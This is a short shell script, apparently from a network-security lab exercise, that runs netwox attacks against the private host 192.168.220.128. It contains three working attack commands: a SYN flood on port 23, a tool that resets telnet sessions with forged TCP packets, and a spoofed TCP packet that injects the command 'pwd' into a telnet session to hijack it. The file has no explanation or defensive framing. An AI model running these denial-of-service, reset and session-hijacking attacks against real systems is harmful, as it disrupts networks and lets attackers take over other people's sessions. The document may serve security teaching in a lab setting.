#!/bin/sh

# SYN Flood
sudo netwox 76 --dst-ip 192.168.220.128 --dst-port 23

# telnet session resetting
sudo netwox 78 -f "dst host 192.168.220.128" -s best

# spoof packet/inject command
sudo netwox 40 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 192.168.220.1 --ip4-dst 192.168.220.128 --ip4-opt "" --tcp-src 61027 --tcp-dst 23 --tcp-seqnum 420670006 --tcp-acknum 5402284 --tcp-ack --tcp-psh --tcp-window 16327 --tcp-opt "" --tcp-data "'pwd'0d0a" --spoofip "best"